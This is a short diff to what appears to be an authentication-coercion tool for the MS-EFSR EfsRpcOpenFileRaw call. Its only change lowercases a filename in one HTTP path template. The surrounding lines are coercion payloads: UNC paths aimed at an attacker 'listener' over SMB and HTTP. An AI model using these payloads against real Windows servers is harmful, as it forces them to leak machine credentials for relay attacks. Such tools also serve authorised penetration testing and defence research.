@@ -41,7 +41,7 @@ class EfsRpcOpenFileRaw(MSPROTOCOLRPCCALL):
         ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
         ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
         ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
-        ("http", '\\\\{{listener}}{{http_listen_port}}/{{rnd(3)}}\\File.txt\x00'),
+        ("http", '\\\\{{listener}}{{http_listen_port}}/{{rnd(3)}}\\file.txt\x00'),
     ]
 
     access = {
